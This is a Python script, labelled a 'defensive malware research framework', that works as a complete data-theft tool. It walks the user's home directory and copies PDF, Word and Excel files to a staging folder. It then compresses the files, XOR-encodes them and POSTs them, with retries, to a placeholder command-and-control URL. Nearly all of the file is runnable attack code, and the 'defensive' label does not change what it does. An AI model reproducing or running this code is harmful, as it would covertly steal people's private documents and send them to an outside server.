#!/usr/bin/env python3
"""Merged Modules for Defensive Malware Research Framework"""

import sys
import json
import time
import os
import shutil
import zlib
import requests
from typing import Dict, Any, List

def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Define the file extensions to search for
        file_extensions = ['.pdf', '.docx', '.xlsx']
        # Define the staging location
        staging_location = os.path.join(os.environ['TEMP'], 'staging')
        os.makedirs(staging_location, exist_ok=True)

        file_paths: List[str] = []
        total_size = 0

        # Walk through the filesystem starting from the user's home directory
        for root, dirs, files in os.walk(os.path.expanduser('~')):
            for file in files:
                if any(file.endswith(ext) for ext in file_extensions):
                    file_path = os.path.join(root, file)
                    file_paths.append(file_path)
                    total_size += os.path.getsize(file_path)
                    # Copy the file to the staging location
                    shutil.copy(file_path, staging_location)

        result = {
            'file_paths': file_paths,
            'total_size': total_size
        }
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}

def xor_encode(data: bytes, key: bytes) -> bytes:
    """XOR-encode the data with the given key."""
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Extract file paths from input data
        file_paths = input_data.get('file_paths', [])
        
        # Read and compress the content of each file
        compressed_data = b''
        for file_path in file_paths:
            with open(file_path, 'rb') as f:
                file_data = f.read()
                compressed_data += zlib.compress(file_data)

        # XOR encode the compressed data
        xor_key = b'secret_key'  # Example key, should be securely managed
        encoded_data = xor_encode(compressed_data, xor_key)

        # Prepare the result
        result = {
            'encoded_data': encoded_data.hex(),
            'encoding': 'xor'
        }
        
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    c2_url = "https://192.168.114.111/api"  # Placeholder C2 server URL
    max_attempts = 3
    attempts = 0

    try:
        encoded_data = bytes.fromhex(input_data.get('encoded_data', ''))
        encoding = input_data.get('encoding', '')

        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'MalwareExfiltrationAgent/1.0'
        }

        payload = {
            'encoded_data': encoded_data.hex(),
            'encoding': encoding
        }

        success = False
        while attempts < max_attempts:
            attempts += 1
            try:
                response = requests.post(c2_url, json=payload, headers=headers, timeout=10)
                if response.status_code == 200:
                    success = True
                    break
            except requests.RequestException:
                time.sleep(5)  # Wait before retrying

        result = {'success': success, 'attempts': attempts}
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'data': {'success': False, 'attempts': 0},
                'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

def main() -> dict:
    """Auto-generated orchestrator — do not edit by hand."""
    outputs: dict = {}
    results: dict = {}
    failed:  list = []
    
    # ── T1: Collect Sensitive Files [collection] ──
    try:
        r = task_T1(None)
        results['T1'] = r
        if r.get('success'):
            outputs['T1'] = r.get('data', {})
            print(f'[+] T1 (Collect Sensitive Files): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T1 (Collect Sensitive Files): FAILED — {err}')
            failed.append('T1')
            print('[!] abort_mission — stopping')
            return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    except Exception as e:
        print(f'[!] T1 crashed: {e}')
        failed.append('T1')
        results['T1'] = {'success': False, 'error': str(e)}
        return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    
    # ── T2: Compress and Encode Files [data-processing] ──
    try:
        r = task_T2(outputs.get('T1', {}))
        results['T2'] = r
        if r.get('success'):
            outputs['T2'] = r.get('data', {})
            print(f'[+] T2 (Compress and Encode Files): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T2 (Compress and Encode Files): FAILED — {err}')
            failed.append('T2')
            print('[!] abort_mission — stopping')
            return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    except Exception as e:
        print(f'[!] T2 crashed: {e}')
        failed.append('T2')
        results['T2'] = {'success': False, 'error': str(e)}
        return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    
    # ── T3: Exfiltrate Encoded Data [exfiltration] ──
    try:
        r = task_T3(outputs.get('T2', {}))
        results['T3'] = r
        if r.get('success'):
            outputs['T3'] = r.get('data', {})
            print(f'[+] T3 (Exfiltrate Encoded Data): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T3 (Exfiltrate Encoded Data): FAILED — {err}')
            failed.append('T3')
            r2 = task_T3(outputs.get('T2', {}))
            if r2.get('success'):
                outputs['T3'] = r2.get('data', {})
                failed.remove('T3')
    except Exception as e:
        print(f'[!] T3 crashed: {e}')
        failed.append('T3')
        results['T3'] = {'success': False, 'error': str(e)}
    
    success = len(failed) == 0
    if success:
        print('[+] All tasks completed successfully')
    else:
        print(f'[-] Failed tasks: {failed}')
    return {'success': success, 'failed': failed,
            'outputs': outputs, 'results': results}

if __name__ == '__main__':
    import json
    result = main()
    print('__RESULT__=' + json.dumps(result))